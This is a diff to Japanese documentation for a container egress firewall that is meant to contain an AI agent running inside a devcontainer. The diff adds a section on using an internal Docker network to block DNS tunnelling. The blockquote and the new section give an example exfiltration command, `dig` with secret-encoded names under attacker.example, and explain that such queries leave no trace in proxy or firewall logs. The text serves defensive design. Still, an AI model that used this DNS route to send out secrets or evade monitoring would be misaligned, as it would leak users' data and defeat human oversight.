@@ -34,7 +34,7 @@ allowlist に載っていない宛先への外向き通信を遮断し、DNS を
 
 - **悪性コンテンツの流入防止** — allowlist に GitHub や npm がある時点で任意のコンテンツは入ります
 - **完全な exfil 防止** — 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります
-- **DNS トンネリングの遮断** — 許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能です
+- **DNS トンネリングの遮断** — 単一ネットワークの構成では、許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能です（internal ネットワークの構成なら塞がります。[internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)）
 - **L7 制御（メソッド別・パス別）** — `layer: "l7"` の proxy も TLS を終端しないため扱いません（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §2.23）
 
 **想定している敵はコンテナ内で動くエージェント自身**です。前提と、各非目標を受容した理由は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §1・§3。
@@ -70,7 +70,7 @@ capability は `NET_ADMIN` と `NET_RAW`。**書く場所は構成で変わり�
 
 `nameserver` に IPv4 アドレスが 1 つも無い場合は、固定を緩めるのではなく **exit≠0 で停止します**。
 
-> **これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.1）。
+> **単一ネットワークの構成では、これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.1）。internal ネットワークの構成ならこの転送自体が止まります（[internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)）。
 
 ---
 
@@ -149,6 +149,20 @@ USER node
 - **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナが相互に到達できる状態になります
 
 判断の根拠（リゾルバの選択で何が変わるか、ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §4 を参照してください。
+
+### internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）
+
+**何のために。** 上の構成でも、dev は Docker の埋め込みリゾルバに外部名を問い合わせられ、リゾルバは再帰的に転送する。`<秘密をエンコードした名前>.attacker.example` のような問い合わせは proxy のログにも firewall の記録にも残らず外へデータを持ち出せる（[DNS トンネリングは防げません](#dns-トンネリングは防げません)）。dev を `internal: true` のネットワークだけに載せ、egress-proxy を internal と外向きの両方に載せると、この転送が止まる。
+
+**どう動くか。** dev は internal 側だけに、egress-proxy は internal と外向きの両方に載せる。**dev を外向きのネットワークにも載せると塞がったことにならない**——1 本でも外向きのネットワークに乗っていると転送が戻る。この性質の機序と根拠は `docs/conventions.md`「発見しにくい事実」を参照。完全な構成は [`images/devcontainer-base/examples/docker-compose.yaml`](../../images/devcontainer-base/examples/docker-compose.yaml) を参照してください。
+
+**必要な Docker の版。** Moby 26.0.0-rc3 / 25.0.5 / 23.0.11 以降が要ります。devcontainer-base の雛形を使う場合に要る base の最低版は [`images/devcontainer-base/README.md`](../../images/devcontainer-base/README.md) を参照してください。
+
+**internal と両立しない機能。** internal には外向きの経路もホストへの経路も無いため、`allowCidrs` と `allowHostPorts` は届きません。実現層 `l3` は dev 側の名前解決で allowlist を作るため、これも internal とは両立しません。これらを使う構成は従来どおり単一ネットワークのままにするしかなく、その場合は DNS の持ち出し経路が残ります。
+
+**L7 実現層の適用ログの警告（`external DNS is still being forwarded`）の意味。** `layer: "l7"` を選んだ設定では、割り当て resolver が外部名を解決できたとき、自己検証がこの警告を適用ログに出します（L3 実現層では自己検証の分岐が異なり、この警告は出ません）。internal の構成でこの警告が出たら、dev が外向きのネットワークにも乗っている、または Docker の版が古いことを疑ってください。
+
+保証: `docs/guarantees.md` の未検証の約束 B-c（起源 `0050-template-internal-network`）と、`tests/firewall-rules.test.sh` に対応する節（L7 実現層の警告そのもの）を参照。
 
 ### 案 A: Docker Compose を使う
 
@@ -614,7 +628,7 @@ L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` �
 
 ## DNS トンネリングは防げません
 
-[できないこと（設計上の非目標）](#できないこと設計上の非目標)と [DNS リゾルバ](#dns-リゾルバ)の注意書きのとおりです。機序と受容の理由は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.1。
+単一ネットワークの構成では、[できないこと（設計上の非目標）](#できないこと設計上の非目標)と [DNS リゾルバ](#dns-リゾルバ)の注意書きのとおりです。機序と受容の理由は [`docs/archive/egress-guard-design.md`](../../docs/archive/egress-guard-design.md) §3.1。internal ネットワークの構成を使う場合は [internal ネットワークで DNS の持ち出しも塞ぐ（より推奨）](#internal-ネットワークで-dns-の持ち出しも塞ぐより推奨)を参照してください。
 
 ## Web 検索は使えます。Web 取得は許可したドメインだけです
 
